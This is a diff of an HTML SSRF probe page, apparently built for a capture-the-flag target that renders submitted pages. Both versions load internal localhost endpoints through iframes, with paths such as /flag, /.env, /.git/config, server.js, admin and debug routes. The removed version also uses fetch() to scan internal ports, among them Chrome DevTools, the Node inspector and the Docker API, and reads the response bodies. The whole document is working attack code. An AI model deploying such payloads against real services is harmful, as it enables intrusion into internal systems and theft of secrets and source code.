@@ -2,173 +2,122 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deep SSRF Probe - Port 3000+</title>
+    <title>Port 3000 Fuzz</title>
     <style>
-        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 15px; font-size: 13px; }
-        h1, h2 { color: #ff0; }
-        .box { border: 1px solid #0f0; margin: 8px 0; padding: 8px; background: #111; }
-        iframe { width: 100%; height: 180px; border: 2px solid #f00; background: #000; }
-        pre { white-space: pre-wrap; word-break: break-all; background: #111; padding: 10px; border: 1px solid #333; }
-        .ok { color: #0f0; }
-        .fail { color: #f55; }
+        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 12px; }
+        .box { border: 1px solid #0f0; margin: 6px 0; padding: 6px; }
+        iframe { width: 100%; height: 160px; border: 2px solid #f00; background: #000; }
+        h2 { color: #ff0; margin-top: 18px; }
     </style>
 </head>
 <body>
-    <h1>Deep Internal Probe</h1>
-    <p>Time: <span id="time"></span></p>
-    <script>document.getElementById('time').textContent = new Date().toISOString();</script>
+    <h1>Port 3000 Endpoint Fuzz</h1>
+    <p>Time: <script>document.write(new Date().toISOString())</script></p>
 
-    <h2>1. iframes - Port 3000 paths</h2>
+    <!-- ===== Core / API ===== -->
+    <h2>Core & API</h2>
+    <div class="box">/ <iframe src="http://127.0.0.1:3000/"></iframe></div>
+    <div class="box">/api <iframe src="http://127.0.0.1:3000/api"></iframe></div>
+    <div class="box">/api/ <iframe src="http://127.0.0.1:3000/api/"></iframe></div>
+    <div class="box">/api/review <iframe src="http://127.0.0.1:3000/api/review"></iframe></div>
+    <div class="box">/api/reviews <iframe src="http://127.0.0.1:3000/api/reviews"></iframe></div>
+    <div class="box">/api/jobs <iframe src="http://127.0.0.1:3000/api/jobs"></iframe></div>
+    <div class="box">/api/status <iframe src="http://127.0.0.1:3000/api/status"></iframe></div>
+    <div class="box">/api/health <iframe src="http://127.0.0.1:3000/api/health"></iframe></div>
+    <div class="box">/api/flag <iframe src="http://127.0.0.1:3000/api/flag"></iframe></div>
+    <div class="box">/api/admin <iframe src="http://127.0.0.1:3000/api/admin"></iframe></div>
+    <div class="box">/api/config <iframe src="http://127.0.0.1:3000/api/config"></iframe></div>
+    <div class="box">/api/debug <iframe src="http://127.0.0.1:3000/api/debug"></iframe></div>
+    <div class="box">/api/internal <iframe src="http://127.0.0.1:3000/api/internal"></iframe></div>
+    <div class="box">/api/v1 <iframe src="http://127.0.0.1:3000/api/v1"></iframe></div>
+    <div class="box">/api/v1/review <iframe src="http://127.0.0.1:3000/api/v1/review"></iframe></div>
 
-    <div class="box"><b>http://127.0.0.1:3000/</b><br>
-        <iframe src="http://127.0.0.1:3000/"></iframe></div>
+    <!-- ===== Health / Status ===== -->
+    <h2>Health & Status</h2>
+    <div class="box">/health <iframe src="http://127.0.0.1:3000/health"></iframe></div>
+    <div class="box">/healthz <iframe src="http://127.0.0.1:3000/healthz"></iframe></div>
+    <div class="box">/ready <iframe src="http://127.0.0.1:3000/ready"></iframe></div>
+    <div class="box">/readyz <iframe src="http://127.0.0.1:3000/readyz"></iframe></div>
+    <div class="box">/live <iframe src="http://127.0.0.1:3000/live"></iframe></div>
+    <div class="box">/livez <iframe src="http://127.0.0.1:3000/livez"></iframe></div>
+    <div class="box">/status <iframe src="http://127.0.0.1:3000/status"></iframe></div>
+    <div class="box">/ping <iframe src="http://127.0.0.1:3000/ping"></iframe></div>
+    <div class="box">/version <iframe src="http://127.0.0.1:3000/version"></iframe></div>
+    <div class="box">/info <iframe src="http://127.0.0.1:3000/info"></iframe></div>
+    <div class="box">/metrics <iframe src="http://127.0.0.1:3000/metrics"></iframe></div>
+    <div class="box">/prometheus <iframe src="http://127.0.0.1:3000/prometheus"></iframe></div>
 
-    <div class="box"><b>http://127.0.0.1:3000/api</b><br>
-        <iframe src="http://127.0.0.1:3000/api"></iframe></div>
+    <!-- ===== Admin / Debug / Flag ===== -->
+    <h2>Admin / Debug / Flag</h2>
+    <div class="box">/admin <iframe src="http://127.0.0.1:3000/admin"></iframe></div>
+    <div class="box">/admin/ <iframe src="http://127.0.0.1:3000/admin/"></iframe></div>
+    <div class="box">/administrator <iframe src="http://127.0.0.1:3000/administrator"></iframe></div>
+    <div class="box">/debug <iframe src="http://127.0.0.1:3000/debug"></iframe></div>
+    <div class="box">/debugger <iframe src="http://127.0.0.1:3000/debugger"></iframe></div>
+    <div class="box">/console <iframe src="http://127.0.0.1:3000/console"></iframe></div>
+    <div class="box">/flag <iframe src="http://127.0.0.1:3000/flag"></iframe></div>
+    <div class="box">/flag.txt <iframe src="http://127.0.0.1:3000/flag.txt"></iframe></div>
+    <div class="box">/flags <iframe src="http://127.0.0.1:3000/flags"></iframe></div>
+    <div class="box">/secret <iframe src="http://127.0.0.1:3000/secret"></iframe></div>
+    <div class="box">/secrets <iframe src="http://127.0.0.1:3000/secrets"></iframe></div>
+    <div class="box">/internal <iframe src="http://127.0.0.1:3000/internal"></iframe></div>
+    <div class="box">/private <iframe src="http://127.0.0.1:3000/private"></iframe></div>
 
-    <div class="box"><b>http://127.0.0.1:3000/api/review</b><br>
-        <iframe src="http://127.0.0.1:3000/api/review"></iframe></div>
+    <!-- ===== Config / Source ===== -->
+    <h2>Config & Source</h2>
+    <div class="box">/.env <iframe src="http://127.0.0.1:3000/.env"></iframe></div>
+    <div class="box">/env <iframe src="http://127.0.0.1:3000/env"></iframe></div>
+    <div class="box">/config <iframe src="http://127.0.0.1:3000/config"></iframe></div>
+    <div class="box">/config.json <iframe src="http://127.0.0.1:3000/config.json"></iframe></div>
+    <div class="box">/package.json <iframe src="http://127.0.0.1:3000/package.json"></iframe></div>
+    <div class="box">/package-lock.json <iframe src="http://127.0.0.1:3000/package-lock.json"></iframe></div>
+    <div class="box">/server.js <iframe src="http://127.0.0.1:3000/server.js"></iframe></div>
+    <div class="box">/app.js <iframe src="http://127.0.0.1:3000/app.js"></iframe></div>
+    <div class="box">/index.js <iframe src="http://127.0.0.1:3000/index.js"></iframe></div>
+    <div class="box">/main.js <iframe src="http://127.0.0.1:3000/main.js"></iframe></div>
+    <div class="box">/src <iframe src="http://127.0.0.1:3000/src"></iframe></div>
+    <div class="box">/src/index.js <iframe src="http://127.0.0.1:3000/src/index.js"></iframe></div>
 
-    <div class="box"><b>http://127.0.0.1:3000/admin</b><br>
-        <iframe src="http://127.0.0.1:3000/admin"></iframe></div>
+    <!-- ===== Static / Common ===== -->
+    <h2>Static & Common</h2>
+    <div class="box">/static <iframe src="http://127.0.0.1:3000/static"></iframe></div>
+    <div class="box">/public <iframe src="http://127.0.0.1:3000/public"></iframe></div>
+    <div class="box">/assets <iframe src="http://127.0.0.1:3000/assets"></iframe></div>
+    <div class="box">/js <iframe src="http://127.0.0.1:3000/js"></iframe></div>
+    <div class="box">/css <iframe src="http://127.0.0.1:3000/css"></iframe></div>
+    <div class="box">/robots.txt <iframe src="http://127.0.0.1:3000/robots.txt"></iframe></div>
+    <div class="box">/sitemap.xml <iframe src="http://127.0.0.1:3000/sitemap.xml"></iframe></div>
+    <div class="box">/favicon.ico <iframe src="http://127.0.0.1:3000/favicon.ico"></iframe></div>
+    <div class="box">/.git <iframe src="http://127.0.0.1:3000/.git"></iframe></div>
+    <div class="box">/.git/HEAD <iframe src="http://127.0.0.1:3000/.git/HEAD"></iframe></div>
+    <div class="box">/.git/config <iframe src="http://127.0.0.1:3000/.git/config"></iframe></div>
+    <div class="box">/node_modules <iframe src="http://127.0.0.1:3000/node_modules"></iframe></div>
 
-    <div class="box"><b>http://127.0.0.1:3000/flag</b><br>
-        <iframe src="http://127.0.0.1:3000/flag"></iframe></div>
+    <!-- ===== Review related ===== -->
+    <h2>Review related</h2>
+    <div class="box">/review <iframe src="http://127.0.0.1:3000/review"></iframe></div>
+    <div class="box">/reviews <iframe src="http://127.0.0.1:3000/reviews"></iframe></div>
+    <div class="box">/snapshot <iframe src="http://127.0.0.1:3000/snapshot"></iframe></div>
+    <div class="box">/snapshots <iframe src="http://127.0.0.1:3000/snapshots"></iframe></div>
+    <div class="box">/pdf <iframe src="http://127.0.0.1:3000/pdf"></iframe></div>
+    <div class="box">/capture <iframe src="http://127.0.0.1:3000/capture"></iframe></div>
+    <div class="box">/job <iframe src="http://127.0.0.1:3000/job"></iframe></div>
+    <div class="box">/jobs <iframe src="http://127.0.0.1:3000/jobs"></iframe></div>
+    <div class="box">/queue <iframe src="http://127.0.0.1:3000/queue"></iframe></div>
+    <div class="box">/worker <iframe src="http://127.0.0.1:3000/worker"></iframe></div>
 
-    <div class="box"><b>http://127.0.0.1:3000/debug</b><br>
-        <iframe src="http://127.0.0.1:3000/debug"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/health</b><br>
-        <iframe src="http://127.0.0.1:3000/health"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/status</b><br>
-        <iframe src="http://127.0.0.1:3000/status"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/metrics</b><br>
-        <iframe src="http://127.0.0.1:3000/metrics"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/.env</b><br>
-        <iframe src="http://127.0.0.1:3000/.env"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/package.json</b><br>
-        <iframe src="http://127.0.0.1:3000/package.json"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/server.js</b><br>
-        <iframe src="http://127.0.0.1:3000/server.js"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/app.js</b><br>
-        <iframe src="http://127.0.0.1:3000/app.js"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/index.js</b><br>
-        <iframe src="http://127.0.0.1:3000/index.js"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/robots.txt</b><br>
-        <iframe src="http://127.0.0.1:3000/robots.txt"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:3000/sitemap.xml</b><br>
-        <iframe src="http://127.0.0.1:3000/sitemap.xml"></iframe></div>
-
-    <h2>2. Other interesting ports</h2>
-
-    <div class="box"><b>http://127.0.0.1:5000/</b><br>
-        <iframe src="http://127.0.0.1:5000/"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:5000/flag</b><br>
-        <iframe src="http://127.0.0.1:5000/flag"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:8000/</b><br>
-        <iframe src="http://127.0.0.1:8000/"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:8080/</b><br>
-        <iframe src="http://127.0.0.1:8080/"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:4000/</b><br>
-        <iframe src="http://127.0.0.1:4000/"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:9222/json</b><br>
-        <iframe src="http://127.0.0.1:9222/json"></iframe></div>
-
-    <div class="box"><b>http://127.0.0.1:9222/json/version</b><br>
-        <iframe src="http://127.0.0.1:9222/json/version"></iframe></div>
-
-    <h2>3. Fetch results (text)</h2>
-    <pre id="out">Running fetch probes...</pre>
-
-    <script>
-        const targets = [
-            // Port 3000
-            "http://127.0.0.1:3000/",
-            "http://127.0.0.1:3000/api",
-            "http://127.0.0.1:3000/api/review",
-            "http://127.0.0.1:3000/admin",
-            "http://127.0.0.1:3000/flag",
-            "http://127.0.0.1:3000/flag.txt",
-            "http://127.0.0.1:3000/debug",
-            "http://127.0.0.1:3000/health",
-            "http://127.0.0.1:3000/status",
-            "http://127.0.0.1:3000/metrics",
-            "http://127.0.0.1:3000/.env",
-            "http://127.0.0.1:3000/package.json",
-            "http://127.0.0.1:3000/server.js",
-            "http://127.0.0.1:3000/app.js",
-            "http://127.0.0.1:3000/index.js",
-            "http://127.0.0.1:3000/robots.txt",
-            "http://127.0.0.1:3000/sitemap.xml",
-            "http://127.0.0.1:3000/static",
-            "http://127.0.0.1:3000/public",
-            "http://127.0.0.1:3000/config",
-            "http://127.0.0.1:3000/env",
-            "http://127.0.0.1:3000/version",
-            "http://127.0.0.1:3000/info",
-
-            // Other ports
-            "http://127.0.0.1:5000/",
-            "http://127.0.0.1:5000/flag",
-            "http://127.0.0.1:8000/",
-            "http://127.0.0.1:8080/",
-            "http://127.0.0.1:4000/",
-            "http://127.0.0.1:9222/json",
-            "http://127.0.0.1:9222/json/version",
-            "http://127.0.0.1:9229/",
-            "http://127.0.0.1:2375/version",
-
-            // localhost variants
-            "http://localhost:3000/",
-            "http://localhost:3000/flag",
-            "http://[::1]:3000/"
-        ];
-
-        async function probe() {
-            let out = "";
-            for (const url of targets) {
-                // no-cors
-                try {
-                    const ctrl = new AbortController();
-                    const t = setTimeout(() => ctrl.abort(), 1200);
-                    await fetch(url, { mode: "no-cors", signal: ctrl.signal });
-                    clearTimeout(t);
-                    out += `[no-cors] ${url} → opaque\n`;
-                } catch (e) {
-                    out += `[no-cors] ${url} → ${e.message}\n`;
-                }
-
-                // cors (try to read body)
-                try {
-                    const ctrl = new AbortController();
-                    const t = setTimeout(() => ctrl.abort(), 1200);
-                    const r = await fetch(url, { mode: "cors", signal: ctrl.signal });
-                    clearTimeout(t);
-                    const text = await r.text();
-                    out += `[cors] ${url} → ${r.status}\n${text.slice(0, 400)}\n\n`;
-                } catch (e) {
-                    out += `[cors] ${url} → ${e.message}\n`;
-                }
-            }
-            document.getElementById("out").textContent = out || "No results";
-        }
-        probe();
-    </script>
+    <!-- ===== Express / Node typical ===== -->
+    <h2>Express / Node typical</h2>
+    <div class="box">/express <iframe src="http://127.0.0.1:3000/express"></iframe></div>
+    <div class="box">/__debug <iframe src="http://127.0.0.1:3000/__debug"></iframe></div>
+    <div class="box">/__inspector <iframe src="http://127.0.0.1:3000/__inspector"></iframe></div>
+    <div class="box">/graphql <iframe src="http://127.0.0.1:3000/graphql"></iframe></div>
+    <div class="box">/graphiql <iframe src="http://127.0.0.1:3000/graphiql"></iframe></div>
+    <div class="box">/playground <iframe src="http://127.0.0.1:3000/playground"></iframe></div>
+    <div class="box">/swagger <iframe src="http://127.0.0.1:3000/swagger"></iframe></div>
+    <div class="box">/swagger.json <iframe src="http://127.0.0.1:3000/swagger.json"></iframe></div>
+    <div class="box">/docs <iframe src="http://127.0.0.1:3000/docs"></iframe></div>
+    <div class="box">/documentation <iframe src="http://127.0.0.1:3000/documentation"></iframe></div>
 
     <h2>Done</h2>
 </body>
